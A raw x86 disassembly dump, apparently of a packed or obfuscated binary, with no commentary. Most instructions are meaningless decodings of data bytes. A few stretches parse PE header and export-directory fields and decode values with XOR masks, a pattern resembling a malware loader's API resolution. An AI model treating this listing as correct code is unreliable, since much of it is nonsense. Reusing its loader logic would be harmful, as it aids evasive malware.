  408dc7:	mov    ds:0x30753176,eax
  408dcc:	mov    ds:0x5c3c41bf,al
  408dd1:	out    0x28,eax
  408dd3:	shl    DWORD PTR [esi+eiz*2-0x72],0xa2
  408dd8:	popf   
  408dd9:	xchg   esi,eax
  408dda:	sub    eax,0xc3557baa
  408ddf:	in     al,dx
  408de0:	jmp    0xe8bc:0x656e476b
  408de7:	sbb    BYTE PTR [ebp-0x12628ef2],0xe7
  408dee:	call   FWORD PTR [ecx+0x3b27fa3a]
  408df4:	mov    ds:0xe239a33,eax
  408df9:	mov    esp,0x9f796d08
  408dfe:	adc    bl,BYTE PTR [ecx+0x5dbf8f61]
  408e04:	xchg   ebx,eax
  408e05:	pop    eax
  408e06:	adc    DWORD PTR [ebx+0x3d3e5d78],eax
  408e0c:	aas    
  408e0d:	test   al,0xe8
  408e0f:	jmp    0xdafe7257
  408e14:	mov    esi,0x368503c1
  408e19:	(bad)  
  408e1a:	fnsave [ebx+0x13ea5f2c]
  408e20:	mov    edx,DWORD PTR [edi-0x48cd9f60]
  408e26:	mov    ax,WORD PTR [ebp-0x4]
  408e2a:	movzx  eax,ax
  408e2d:	sub    ecx,edi
  408e2f:	cmp    eax,ecx
  408e31:	mov    eax,DWORD PTR [ebp+0x10]
  408e34:	movzx  ecx,WORD PTR [ebp-0x4]
  408e38:	jg     0x408e4d
  408e3e:	xor    eax,esi
  408e40:	sub    ecx,eax
  408e42:	sub    ecx,edi
  408e44:	mov    WORD PTR [ebp-0x4],cx
  408e48:	jmp    0x408e5a
  408e4d:	xor    eax,esi
  408e4f:	lea    eax,[eax+ecx*1+0x32729b]
  408e56:	mov    WORD PTR [ebp-0x4],ax
  408e5a:	mov    eax,DWORD PTR [ebp-0xc]
  408e5d:	cmp    eax,ebx
  408e5f:	je     0x408e73
  408e65:	mov    eax,DWORD PTR [ebp-0x8]
  408e68:	mov    DWORD PTR [eax],0x60341e89
  408e6e:	jmp    0x409836
  408e73:	mov    eax,DWORD PTR [ebp+0x8]
  408e76:	mov    ecx,DWORD PTR [ebp-0x8]
  408e79:	xor    eax,esi
  408e7b:	add    eax,edi
  408e7d:	cmp    DWORD PTR [ecx],eax
  408e7f:	je     0x409149
  408e85:	mov    ecx,DWORD PTR [ebp-0x14]
  408e88:	mov    eax,DWORD PTR [ebp-0x8]
  408e8b:	mov    eax,DWORD PTR [eax]
  408e8d:	mov    eax,DWORD PTR [eax+0x3c]
  408e90:	lea    ecx,[ecx*8+0x78]
  408e97:	add    eax,ecx
  408e99:	mov    ecx,DWORD PTR [ebp-0x8]
  408e9c:	mov    ecx,DWORD PTR [ecx]
  408e9e:	mov    eax,DWORD PTR [eax+ecx*1]
  408ea1:	mov    DWORD PTR [ebp-0x1c],eax
  408ea4:	mov    eax,DWORD PTR [ebp+0x8]
  408ea7:	jmp    0x4090ee
  408eac:	sbb    al,0x56
  408eae:	aam    0xcf
  408eb0:	je     0x408eff
  408eb2:	and    eax,0xfc4f2b75
  408eb7:	adc    eax,0x5c2b03bf
  408ebc:	or     al,0xd1
  408ebe:	jle    0x408f3e
  408ec0:	and    al,0x7c
  408ec2:	jle    0x408f42
  408ec4:	push   cs
  408ec5:	inc    edx
  408ec6:	push   0x36ab1793
  408ecb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ecc:	dec    edx
  408ecd:	sar    DWORD PTR [ebp-0x3520e874],1
  408ed3:	mov    esi,0x145cd895
  408ed8:	scas   eax,DWORD PTR es:[edi]
  408ed9:	jg     0x408e69
  408edb:	pop    edi
  408edc:	push   edi
  408edd:	cs push 0xffffff90
  408ee0:	ret    0x60f6
  408ee3:	stos   DWORD PTR es:[edi],eax
  408ee4:	mov    ebp,DWORD PTR [ecx]
  408ee6:	(bad)  
  408ee7:	adc    dh,dh
  408ee9:	pusha  
  408eea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408eeb:	dec    eax
  408eec:	and    esi,DWORD PTR [ebx]
  408eee:	mov    al,ds:0xf67f9e29
  408ef3:	bound  edx,QWORD PTR [eax+edx*8-0x3dbc4600]
  408efa:	aas    
  408efb:	or     eax,ecx
  408efd:	sbb    DWORD PTR [ecx-0x1],ebx
  408f00:	sub    eax,0xf99efea3
  408f05:	ficom  WORD PTR [ecx-0x38112351]
  408f0b:	retf   
  408f0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f0d:	mov    esi,0x4bca0419
  408f12:	repnz int3 
  408f14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f15:	aaa    
  408f16:	mov    ?,WORD PTR [esi+0x4a]
  408f19:	test   ebp,ecx
  408f1b:	dec    ecx
  408f1c:	mov    edi,0xb76f8295
  408f21:	lods   al,BYTE PTR ds:[esi]
  408f22:	fadd   QWORD PTR [edi-0x6]
  408f25:	mov    dl,ah
  408f27:	push   ss
  408f28:	inc    esp
  408f29:	or     DWORD PTR [ebp-0x6dfc41c7],edx
  408f2f:	jmp    0x408f37
  408f31:	cmp    bh,BYTE PTR [edi+0x6908f9e3]
  408f37:	dec    edx
  408f38:	(bad)  
  408f39:	adc    edi,esp
  408f3b:	fcom   DWORD PTR [ebx+edx*8]
  408f3e:	hlt    
  408f3f:	push   0x5a3d75e
  408f44:	push   edx
  408f45:	das    
  408f46:	lods   al,BYTE PTR ds:[esi]
  408f47:	lea    esp,[ecx]
  408f49:	in     eax,dx
  408f4a:	aaa    
  408f4b:	daa    
  408f4c:	pop    eax
  408f4d:	stos   WORD PTR es:[edi],ax
  408f4f:	popa   
  408f50:	push   ecx
  408f51:	rcr    ebp,0x16
  408f54:	test   BYTE PTR [ebp-0x6a],al
  408f57:	jne    0x408f65
  408f59:	inc    ecx
  408f5a:	xor    eax,0x57210bbe
  408f5f:	lods   eax,DWORD PTR ds:[esi]
  408f60:	mov    BYTE PTR [eax],al
  408f62:	add    DWORD PTR [edx-0x38],esp
  408f65:	mov    cl,0xde
  408f67:	jmp    0x40eecfe4
  408f6c:	sbb    eax,0xf7809092
  408f71:	(bad)  
  408f72:	idiv   DWORD PTR [ecx]
  408f74:	aas    
  408f75:	sbb    edx,eax
  408f77:	fisub  DWORD PTR [ebx+0x57]
  408f7a:	repz adc al,0x89
  408f7d:	js     0x408fa3
  408f7f:	pop    es
  408f80:	rcr    BYTE PTR [eax-0x30e74446],1
  408f86:	inc    ebx
  408f87:	mov    ecx,0x908f93de
  408f8c:	ficom  DWORD PTR [ebp-0x74]
  408f8f:	jbe    0x408fb8
  408f91:	fs push edx
  408f93:	dec    ebx
  408f94:	les    ebp,FWORD PTR [ebx]
  408f96:	sbb    eax,0x73945fb
  408f9b:	adc    al,0xb4
  408f9d:	cwde   
  408f9e:	push   DWORD PTR [eax-0x26]
  408fa1:	out    0x6f,eax
  408fa3:	xchg   DWORD PTR [esi],ebx
  408fa5:	xchg   ebp,eax
  408fa6:	xor    eax,0x7567a34
  408fab:	retf   0x71ef
  408fae:	jno    0x408ff2
  408fb0:	or     al,0xf6
  408fb2:	stc    
  408fb3:	push   esi
  408fb4:	retf   0x4f11
  408fb7:	lea    ecx,[ecx+0x4e]
  408fba:	clc    
  408fbb:	(bad)  
  408fbc:	cmp    DWORD PTR [ecx],eax
  408fbe:	imul   ebp,DWORD PTR [ecx],0x83a7e2dc
  408fc4:	enter  0x2b07,0xd5
  408fc8:	out    dx,al
  408fc9:	daa    
  408fca:	jnp    0x408f65
  408fcc:	shl    DWORD PTR [edi-0x55d9a079],0xa2
  408fd3:	pop    eax
  408fd4:	mov    ebx,0xc4ad4a6d
  408fd9:	dec    edx
  408fda:	jb     0x408f5d
  408fdc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408fdd:	nop
  408fde:	jmp    0x408f6d
  408fe0:	xor    eax,0x891a47cd
  408fe5:	add    DWORD PTR [ebp+0x24ee9f3b],0xdd2f5073
  408fef:	fiadd  DWORD PTR [ebp+0x3521183a]
  408ff5:	fld    QWORD PTR [ebx-0x47]
  408ff8:	fstp   DWORD PTR [ebp-0x7ce73986]
  408ffe:	jno    0x409057
  409000:	add    DWORD PTR [edx+0x59c33378],ebp
  409006:	stc    
  409007:	dec    edi
  409008:	les    esp,FWORD PTR [edx+ebx*4]
  40900b:	mov    ecx,0x173a31d9
  409010:	stc    
  409011:	icebp  
  409012:	dec    edx
  409013:	sbb    BYTE PTR [esi+0x31],bl
  409016:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409017:	dec    eax
  409018:	icebp  
  409019:	scas   eax,DWORD PTR es:[edi]
  40901a:	es jns 0x409046
  40901d:	inc    ebp
  40901e:	scas   al,BYTE PTR es:[edi]
  40901f:	mov    edx,0x3759beac
  409024:	xor    DWORD PTR [eax],esp
  409026:	push   DWORD PTR [ebx-0x1a41997e]
  40902c:	shl    ecx,0x6a
  40902f:	push   ebp
  409030:	sahf   
  409031:	int    0xa8
  409033:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409034:	pop    eax
  409035:	out    0x7a,eax
  409037:	das    
  409038:	cmp    eax,DWORD PTR [edx]
  40903a:	mov    ch,0xa9
  40903c:	cmp    edx,DWORD PTR [esi+0x1818c54f]
  409042:	inc    edi
  409043:	xchg   edi,eax
  409044:	push   ecx
  409045:	jmp    0x5e4:0x29d385ee
  40904c:	ret    
  40904d:	cli    
  40904e:	inc    ebp
  40904f:	pop    ebx
  409050:	scas   al,BYTE PTR es:[edi]
  409051:	das    
  409052:	into   
  409053:	aaa    
  409054:	dec    edx
  409055:	pop    ss
  409056:	inc    ebx
  409057:	ds out dx,eax
  409059:	fsub   st(0),st
  40905b:	das    
  40905c:	outs   dx,DWORD PTR ds:[esi]
  40905d:	xor    DWORD PTR [esi],esi
  40905f:	adc    eax,0xea2806a8
  409064:	jne    0x409037
  409066:	xor    edi,DWORD PTR [eax-0x6d]
  409069:	shr    BYTE PTR [edx-0x1a8b1e3b],1
  40906f:	lds    eax,FWORD PTR [edi-0x6eb9f3e]
  409075:	mov    ch,0x57
  409077:	test   DWORD PTR [ecx+0x45],edi
  40907a:	popf   
  40907b:	cli    
  40907c:	not    DWORD PTR [ecx+0x5c3e4867]
  409082:	xchg   ecx,ebp
  409084:	jle    0x409058
  409086:	push   es
  409087:	fimul  DWORD PTR [esi+0x14dd7fc]
  40908d:	lea    eax,es:0x67cc51f2
  409094:	sub    dl,dl
  409096:	mov    ebx,0xfd986c7a
  40909b:	pusha  
  40909c:	xchg   ecx,eax
  40909d:	inc    ebx
  40909e:	hlt    
  40909f:	jnp    0x4090aa
  4090a1:	xchg   DWORD PTR [ebx-0x7e360fcf],esp
  4090a7:	add    BYTE PTR ds:0x9ef50656,0x6f
  4090ae:	and    ebp,DWORD PTR [esi+0x6b]
  4090b1:	xchg   edi,eax
  4090b2:	cmc    
  4090b3:	and    DWORD PTR [esi],edx
  4090b5:	in     eax,0xcd
  4090b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4090b8:	std    
  4090b9:	je     0x409114
  4090bb:	cmp    esi,DWORD PTR [ebx+edi*2]
  4090be:	stos   DWORD PTR es:[edi],eax
  4090bf:	xchg   edx,eax
  4090c0:	jmp    0x3172087
  4090c5:	xor    BYTE PTR [ecx+ebp*1-0x5c],bl
  4090c9:	xor    eax,0x383efcb1
  4090ce:	pop    esp
  4090cf:	xor    BYTE PTR [edi+0x2080335],bl
  4090d5:	aad    0x56
  4090d7:	retf   0x2226
  4090da:	mov    edx,0x2291743d
  4090df:	cmp    al,0x87
  4090e1:	sbb    esp,edx
  4090e3:	jle    0x4090b4
  4090e5:	clc    
  4090e6:	xor    al,BYTE PTR [ebp-0x47]
  4090e9:	rcr    ch,cl
  4090eb:	sub    BYTE PTR [eax+0x16],bl
  4090ee:	xor    eax,esi
  4090f0:	add    eax,edi
  4090f2:	mov    DWORD PTR [ebp-0x20],eax
  4090f5:	mov    eax,DWORD PTR [ebp+0x8]
  4090f8:	mov    ecx,DWORD PTR [ebp-0x1c]
  4090fb:	xor    eax,esi
  4090fd:	add    eax,edi
  4090ff:	cmp    ecx,eax
  409101:	je     0x409836
  409107:	mov    eax,DWORD PTR [ebp-0x8]
  40910a:	mov    ecx,DWORD PTR [ebp-0x1c]
  40910d:	add    ecx,DWORD PTR [eax]
  40910f:	mov    DWORD PTR [ebp-0x20],ecx
  409112:	mov    eax,DWORD PTR [ebp-0x20]
  409115:	mov    ecx,DWORD PTR [ebp-0x8]
  409118:	mov    eax,DWORD PTR [eax+0xc]
  40911b:	mov    ecx,DWORD PTR [ecx]
  40911d:	mov    al,BYTE PTR [eax+ecx*1]
  409120:	add    al,0x38
  409122:	xor    al,0x46
  409124:	cmp    al,0xc5
  409126:	je     0x40913d
  40912c:	mov    eax,DWORD PTR [ebp+0x8]
  40912f:	mov    ecx,DWORD PTR [ebp-0x8]
  409132:	xor    eax,esi
  409134:	add    eax,edi
  409136:	mov    DWORD PTR [ecx],eax
  409138:	jmp    0x409836
  40913d:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  409144:	jmp    0x409836
  409149:	mov    eax,DWORD PTR [ebp-0x8]
  40914c:	mov    ecx,DWORD PTR [ebp-0x18]
  40914f:	mov    ecx,DWORD PTR [ecx]
  409151:	jmp    0x409398
  409156:	sbb    eax,0xe1aec100
  40915b:	outs   dx,DWORD PTR ds:[esi]
  40915c:	jno    0x4090ef
  40915e:	out    dx,al
  40915f:	jne    0x4090f6
  409161:	mov    bh,0x1d
  409163:	inc    eax
  409164:	out    dx,al
  409165:	jnp    0x409199
  409167:	fistp  QWORD PTR [esi+0x7e]
  40916a:	and    al,0x7c
  40916c:	jle    0x4091ec
  40916e:	leave  
  40916f:	inc    esi
  409170:	mov    ch,BYTE PTR [esi-0x70dbe64b]
  409176:	mov    ebx,0xf684339a
  40917b:	adc    ecx,ebp
  40917d:	push   es
  40917e:	pop    eax
  40917f:	mov    eax,ds:0x366da6f3
  409184:	sbb    DWORD PTR [esi+0x9],edi
  409187:	xchg   esi,eax
  409188:	rcl    DWORD PTR [ebp+0x42c5cfb5],cl
  40918e:	in     eax,0xbd
  409190:	inc    edx
  409191:	inc    edx
  409192:	add    BYTE PTR [esp+ebx*8-0x694e0f9],0xd8
  40919a:	call   0x6103:0x30552b4
  4091a1:	vmread DWORD PTR [ecx+0x7656c4e3],ecx
  4091a8:	iret   
  4091a9:	xchg   ecx,eax
  4091aa:	cli    
  4091ab:	push   edx
  4091ac:	sbb    al,0x35
  4091ae:	push   ebp
  4091af:	and    BYTE PTR [esi],dh
  4091b1:	adc    BYTE PTR [edi-0x31],bl
  4091b4:	es add eax,0xb6d96018
  4091ba:	jb     0x409237
  4091bc:	out    0x37,al
  4091be:	and    edi,DWORD PTR [ecx+0x336637e6]
  4091c4:	xor    BYTE PTR [edx-0x4ee02441],dl
  4091ca:	pop    ds
  4091cb:	int    0x46
  4091cd:	sub    eax,0x7bf34b48
  4091d2:	add    al,0x3a
  4091d4:	jge    0x40917e
  4091d6:	dec    edx
  4091d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4091d8:	xor    DWORD PTR ds:0xe9b5db7a,eax
  4091de:	aas    
  4091df:	xor    BYTE PTR [eax-0x79],ah
  4091e2:	addr16 in eax,dx
  4091e4:	jge    0x409263
  4091e6:	pushf  
  4091e7:	out    dx,eax
  4091e8:	cs fs fwait
  4091eb:	jge    0x40924e
  4091ed:	and    BYTE PTR [esi+0x48],ch
  4091f0:	dec    edx
  4091f1:	in     eax,0x10
  4091f3:	and    dh,bh
  4091f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4091f6:	push   cs
  4091f7:	cld    
  4091f8:	shr    BYTE PTR [edx-0x7b],0xf2
  4091fc:	pop    ss
  4091fd:	and    edi,ecx
  4091ff:	mov    DWORD PTR [ebx],esi
  409201:	sar    BYTE PTR [edi],cl
  409203:	push   0xffffffd9
  409205:	xchg   ecx,eax
  409206:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409207:	ror    BYTE PTR [ebp-0x3e9db30f],1
  40920d:	mov    ebp,0x8fe129e
  409212:	test   BYTE PTR [ecx+edi*4-0x40],bl
  409216:	xchg   ecx,eax
  409217:	push   es
  409218:	ja     0x4091f6
  40921a:	sbb    al,0xfb
  40921c:	xchg   ebx,eax
  40921d:	push   0xf606f34e
  409222:	test   ch,ah
  409224:	ins    BYTE PTR es:[edi],dx
  409225:	mov    ch,0xcb
  409227:	or     eax,0x4ad01401
  40922c:	cdq    
  40922d:	mov    al,ds:0xaa5a8200
  409232:	into   
  409233:	jl     0x409245
  409235:	push   es
  409236:	icebp  
  409237:	jp     0x4091fb
  409239:	ins    DWORD PTR es:[edi],dx
  40923a:	leave  
  40923b:	ins    BYTE PTR es:[edi],dx
  40923c:	int    0xc
  40923e:	xchg   ecx,eax
  40923f:	div    BYTE PTR [esi-0xf79e504]
  409245:	xchg   ebp,eax
  409246:	dec    BYTE PTR [eax+edi*4]
  409249:	out    dx,al
  40924a:	jmp    0x4cc10840
  40924f:	xchg   esi,eax
  409250:	(bad)  
  409251:	mov    dh,BYTE PTR [esi+0x75]
  409254:	add    DWORD PTR [ecx],0x4c
  409257:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409258:	sub    cl,bh
  40925a:	and    eax,0x29a0112b
  40925f:	inc    ebx
  409260:	xchg   ebp,eax
  409261:	call   0x7bab:0x85e35944
  409268:	(bad)  
  409269:	sub    eax,0x459f9b6
  40926e:	addr16 (bad) 
  409271:	jae    0x409247
  409273:	or     eax,0xeb64f0ed
  409278:	popf   
  409279:	xor    dh,bl
  40927b:	mov    eax,ds:0x44bba77f
  409280:	mov    ecx,0xd9f0f9e4
  409285:	clc    
  409286:	ds daa 
  409288:	lea    esp,[bp+di-0x71bd]
  40928d:	daa    
  40928e:	cmp    edx,edx
  409290:	std    
  409291:	pop    edi
  409292:	test   al,0x86
  409294:	xor    DWORD PTR [ebx-0xebeef8c],edx
  40929a:	dec    esi
  40929b:	lods   eax,DWORD PTR ds:[esi]
  40929c:	(bad)  
  40929d:	jl     0x4092e0
  40929f:	xchg   ebx,edi
  4092a1:	lods   eax,DWORD PTR ds:[esi]
  4092a2:	jno    0x409230
  4092a4:	sub    al,0xcc
  4092a6:	add    edi,DWORD PTR [ebp-0x11]
  4092a9:	push   ebp
  4092aa:	addr16 or eax,0x204e2d07
  4092b0:	dec    esp
  4092b1:	sahf   
  4092b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4092b3:	loope  0x40924e
  4092b5:	dec    esp
  4092b6:	inc    eax
  4092b7:	cmp    bh,BYTE PTR [edi-0x3cbbe8fe]
  4092bd:	(bad)
  4092c0:	fsub   DWORD PTR [esi]
  4092c2:	das    
  4092c3:	mov    dl,0xf5
  4092c5:	mov    cl,cl
  4092c7:	mov    esi,0x9a92d85d
  4092cc:	xchg   ebp,eax
  4092cd:	mov    al,0xea
  4092cf:	into   
  4092d0:	test   eax,0x248ba1fb
  4092d5:	adc    eax,0xc03af38b
  4092da:	gs cwde 
  4092dc:	aad    0xb
  4092de:	push   ebp
  4092df:	in     al,0xc
  4092e1:	pop    ebx
  4092e2:	add    al,0x37
  4092e4:	jmp    0xda045fab
  4092e9:	xchg   ecx,eax
  4092ea:	or     al,0x99
  4092ec:	push   ebp
  4092ed:	cmp    al,BYTE PTR [ebx-0x691fafc4]
  4092f3:	xor    ebx,DWORD PTR [ebp-0x53]
  4092f6:	ins    DWORD PTR es:[edi],dx
  4092f7:	mov    ah,0xfe
  4092f9:	dec    edx
  4092fa:	ss pop ds
  4092fc:	sub    BYTE PTR [ebx+0xf],dh
  4092ff:	inc    edx
  409300:	iret   
  409301:	shr    DWORD PTR [eax],1
  409303:	adc    al,0x39
  409305:	sbb    eax,0x5989eede
  40930a:	sbb    ebx,esi
  40930c:	xchg   esp,eax
  40930d:	xchg   ebx,eax
  40930e:	repnz cmp esp,DWORD PTR [edi-0x375aedf0]
  409315:	adc    esp,DWORD PTR [esi+0x71741991]
  40931b:	stc    
  40931c:	sbb    DWORD PTR [ebx-0x71],esi
  40931f:	aas    
  409320:	adc    eax,0x1919942b
  409325:	clc    
  409326:	fnstsw WORD PTR ds:0x175eaee
  40932c:	das    
  40932d:	xchg   ecx,eax
  40932e:	dec    edx
  40932f:	mov    cs,WORD PTR [ebp-0x32c48725]
  409335:	(bad)  
  409336:	das    
  409337:	loope  0x409309
  409339:	aad    0x11
  40933b:	dec    ecx
  40933c:	sahf   
  40933d:	jle    0x4092d1
  40933f:	sbb    ebp,eax
  409341:	lods   eax,DWORD PTR ds:[esi]
  409342:	mov    BYTE PTR [esi+0x31bb58],al
  409348:	test   eax,0xdc6f78a2
  40934d:	mov    cl,0x2f
  40934f:	inc    eax
  409350:	sbb    DWORD PTR [ecx-0x311b88b],edx
  409356:	out    dx,eax
  409357:	sub    al,0xae
  409359:	mov    es,WORD PTR [ebx+0x48d56510]
  40935f:	mov    esp,0xd2b73154
  409364:	cld    
  409365:	and    bl,BYTE PTR [eax+edi*4]
  409368:	gs test eax,0x645715a
  40936e:	cmp    eax,0x75294ff6
  409373:	repnz (bad) 
  409376:	retf   0xb909
  409379:	je     0x79ef3052
  40937f:	mov    eax,0xe72a321f
  409385:	jge    0x4093f2
  409387:	fst    DWORD PTR [ebx+ecx*8]
  40938a:	inc    edi
  40938b:	sub    DWORD PTR [edi+ebx*2],0xffffff8a
  40938f:	js     0x40935e
  409391:	mov    ch,0x2
  409393:	je     0x8a33b26b
  409399:	or     BYTE PTR [ebx+0x458b0c45],cl
  40939f:	or     bh,bh
  4093a1:	jne    0x40939b
  4093a3:	jmp    0x4095ea
  4093a8:	lods   eax,DWORD PTR ds:[esi]
  4093a9:	mov    dl,0xfe
  4093ab:	outs   dx,BYTE PTR ds:[esi]
  4093ac:	xor    DWORD PTR [edx+0x6d],0x15d7aa71
  4093b3:	pop    edi
  4093b4:	sbb    eax,0xd80d014e
  4093b9:	fnstsw WORD PTR [esi+0x7e]
  4093bc:	and    al,0x7c
  4093be:	jle    0x40943e
  4093c0:	stos   BYTE PTR es:[edi],al
  4093c1:	cmp    al,0x5b
  4093c3:	or     ecx,edx
  4093c5:	xchg   ebx,eax
  4093c6:	fisubr WORD PTR [eax+eiz*8-0x4e34b4e1]
  4093cd:	pop    edi
  4093ce:	aad    0xb4
  4093d0:	lods   al,BYTE PTR ds:[esi]
  4093d1:	mov    eax,ds:0x33a3a59f
  4093d6:	xchg   BYTE PTR [ebp+0x185c51f6],bl
  4093dc:	(bad)  
  4093dd:	xchg   esi,eax
  4093de:	push   esp
  4093df:	xchg   ebp,eax
  4093e0:	stos   BYTE PTR es:[edi],al
  4093e1:	jg     0x409416
  4093e3:	jg     0x40940c
  4093e5:	mov    ds:0x8cca123e,al
  4093ea:	dec    ebx
  4093eb:	mov    dh,0xa9
  4093ed:	jne    0x40941d
  4093ef:	jo     0x409425
  4093f1:	inc    esi
  4093f2:	inc    eax
  4093f3:	aaa    
  4093f4:	shr    bh,1
  4093f6:	syscall 
  4093f8:	dec    esi
  4093f9:	add    BYTE PTR [ebx+esi*1+0x14],ch
  4093fd:	retf   0x6d5c
  409400:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409401:	shl    DWORD PTR [esi],1
  409403:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409404:	xor    DWORD PTR [eax+0x3caeef7b],0x638970b1
  40940e:	or     BYTE PTR [esi+0x799a2205],bl
  409414:	adc    ah,bh
  409416:	push   ss
  409417:	dec    eax
  409418:	pushf  
  409419:	mov    ah,0xbc
  40941b:	xor    edi,DWORD PTR [esi]
  40941d:	mov    BYTE PTR [edi-0x5e7e1ea5],cl
  409423:	fbld   TBYTE PTR [ebx-0x591b76ab]
  409429:	and    DWORD PTR [ecx+0x6e],edi
  40942c:	jmp    0xb7c59742
  409431:	pop    ebx
  409432:	pop    ebx
  409433:	fucomip st,st(7)
  409435:	enter  0xb83c,0xd5
  409439:	add    DWORD PTR [ebx+0x3db6ffae],ebx
  40943f:	mov    dh,0xef
  409441:	xchg   ebx,eax
  409442:	cmp    esi,DWORD PTR [esi-0x30620671]
  409448:	inc    esp
  409449:	retf   
  40944a:	mov    ds:0x59a8ff27,al
  40944f:	adc    DWORD PTR [esi-0x3c],ebp
  409452:	push   edi
  409453:	loope  0x4093e9
  409455:	mov    BYTE PTR [edx+ecx*4-0x15],ch
  409459:	call   0x62cf:0x2e9f6e80
  409460:	cld    
  409461:	add    bl,dl
  409463:	cdq    
  409464:	adc    eax,0x27bf918e
  409469:	pop    ebp
  40946a:	jns    0x4093f5
  40946c:	scas   al,BYTE PTR es:[edi]
  40946d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40946e:	sbb    DWORD PTR [esi-0x3496698],ebp
  409474:	sub    al,BYTE PTR [ecx+esi*1]
  409477:	gs cld 
  409479:	lds    ebx,FWORD PTR ds:0xf31b1e0b
  40947f:	in     eax,0x46
  409481:	inc    esp
  409482:	test   al,0xb3
  409484:	cdq    
  409485:	ror    DWORD PTR [ebp+0x268cca86],1
  40948b:	sbb    BYTE PTR [eax-0x13],ah
  40948e:	sar    BYTE PTR [edx+edx*4],cl
  409491:	(bad)  
  409492:	xchg   esi,eax
  409493:	bound  edi,QWORD PTR [edi+0x43]
  409496:	pop    ss
  409497:	out    0x83,al
  409499:	test   eax,0x3f824c19
  40949e:	ja     0x4094d0
  4094a0:	push   esp
  4094a1:	push   0x756c0f61
  4094a6:	jle    0x409457
  4094a8:	xchg   BYTE PTR [ebp+0x5b387261],ch
  4094ae:	jg     0x4094e5
  4094b0:	mov    bl,0xf3
  4094b3:	ins    DWORD PTR es:[edi],dx
  4094b4:	adc    BYTE PTR [edi-0xe6a1057],cl
  4094ba:	xor    dl,bl
  4094bc:	test   eax,0xd3cfefdc
  4094c1:	call   0xd8cda5dd
  4094c6:	adc    BYTE PTR [ebp+0x4535e26b],bh
  4094cc:	cmc    
  4094cd:	and    esi,DWORD PTR [edx-0x68]
  4094d0:	and    edi,DWORD PTR [eax+0x13eaa646]
  4094d6:	jnp    0x409533
  4094d8:	push   ebp
  4094d9:	push   edi
  4094da:	pop    esp
  4094db:	push   ebx
  4094dc:	mov    ecx,0x4f185559
  4094e1:	into   
  4094e2:	mov    al,ds:0x670fb879
  4094e7:	fadd   st,st(7)
  4094e9:	sahf   
  4094ea:	scas   eax,DWORD PTR es:[edi]
  4094eb:	imul   edi,DWORD PTR [edx+0x77cc0fb6],0x8
  4094f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4094f3:	cs sahf 
  4094f5:	and    esi,DWORD PTR [esi-0x29]
  4094f8:	sbb    eax,0x95dd5519
  4094fd:	push   ebp
  4094fe:	aas    
  4094ff:	inc    DWORD PTR ds:0xaf62ab49
  409505:	jae    0x409522
  409507:	lahf   
  409508:	in     al,dx
  409509:	sbb    DWORD PTR [edx],ecx
  40950b:	add    esi,ecx
  40950d:	dec    ecx
  40950e:	pop    edi
  40950f:	sbb    al,0x16
  409511:	jo     0x5bdcb785
  409517:	rcl    al,cl
  409519:	lock enter 0x63b,0x58
  40951e:	pop    es
  40951f:	sub    esp,ebp
  409521:	or     eax,0x27307de9
  409526:	push   cs
  409527:	mov    bl,BYTE PTR [edi]
  409529:	mov    ah,0xbc
  40952b:	sub    ecx,DWORD PTR [ecx+0x4d]
  40952e:	(bad)  
  40952f:	cld    
  409530:	jns    0x4094e3
  409532:	mov    dl,0x6b
  409534:	int    0x10
  409536:	push   edi
  409537:	out    dx,al
  409538:	pop    ebp
  409539:	push   ss
  40953a:	fstp   DWORD PTR [eax]
  40953c:	dec    edi
  40953d:	or     DWORD PTR [ebx],esi
  40953f:	inc    esp
  409540:	into   
  409541:	mov    esp,ds
  409543:	enter  0xc93f,0x72
  409547:	xchg   ebp,eax
  409548:	lahf   
  409549:	rcl    edi,1
  40954b:	or     bh,BYTE PTR [ebx-0x7c]
  40954e:	add    al,0x32
  409550:	or     eax,0x71dd4eb1
  409555:	push   cs
  409556:	jge    0x409522
  409558:	push   esi
  409559:	dec    edx
  40955a:	inc    ecx
  40955b:	ja     0x409592
  40955d:	sahf   
  40955e:	adc    BYTE PTR [eax],0xea
  409561:	xor    edx,DWORD PTR [ebx]
  409563:	rol    DWORD PTR [esp+ebp*4-0x7f6400d7],cl
  40956a:	shl    BYTE PTR [ebx+edx*4],cl
  40956d:	cs mov dl,0x80
  409570:	ficomp WORD PTR [esi+0xc]
  409573:	push   cs
  409574:	inc    edi
  409575:	add    al,0x4d
  409577:	add    DWORD PTR [edi-0x79ec273e],0xa5f49408
  409581:	push   es
  409582:	jg     0x409537
  409584:	(bad)  
  409585:	jge    0x409585
  409587:	arpl   bx,bx
  409589:	mov    esi,esp
  40958b:	mov    eax,ds:0x9f32d941
  409590:	push   0xfffffffe
  409592:	xlat   BYTE PTR ds:[ebx]
  409593:	mov    bl,BYTE PTR [ecx+0x4d15f44d]
  409599:	jge    0x409612
  40959b:	jl     0x40960a
  40959d:	(bad)  
  40959e:	jmp    0x10a346bf
  4095a3:	xor    esp,edx
  4095a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4095a6:	test   BYTE PTR [esi-0x77],bh
  4095a9:	shl    BYTE PTR [ebx+ebp*4-0x7c],cl
  4095ad:	sbb    dh,BYTE PTR [esi+0x5d]
  4095b0:	adc    DWORD PTR [ecx-0x1f],esi
  4095b3:	aad    0x78
  4095b5:	push   esi
  4095b6:	mov    ds,WORD PTR [ecx]
  4095b8:	outs   dx,BYTE PTR ds:[esi]
  4095b9:	sbb    al,0xa5
  4095bb:	bound  esi,QWORD PTR [edx-0x26]
